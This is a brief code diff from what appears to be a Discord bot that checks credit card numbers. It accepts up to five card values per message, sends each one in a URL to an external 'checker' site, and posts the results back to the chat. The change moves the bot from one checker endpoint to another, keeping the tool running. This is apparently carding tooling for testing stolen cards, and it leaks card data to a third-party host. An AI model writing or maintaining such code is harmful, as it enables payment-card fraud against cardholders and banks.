@@ -50,7 +50,7 @@ if(cc.length > 5){
 return message.reply("5 CC POR VEZ FDP");
 }
         cc.forEach(function (value) {
-      Request("http://thelimao.kinghost.net/checker.php?ccs=" + value, function(result) {
+      Request("http://thelimaochecker.tk/painel/full/api.php?dados=" + value, function(result) {
             message.channel.send(result);
       });
         });
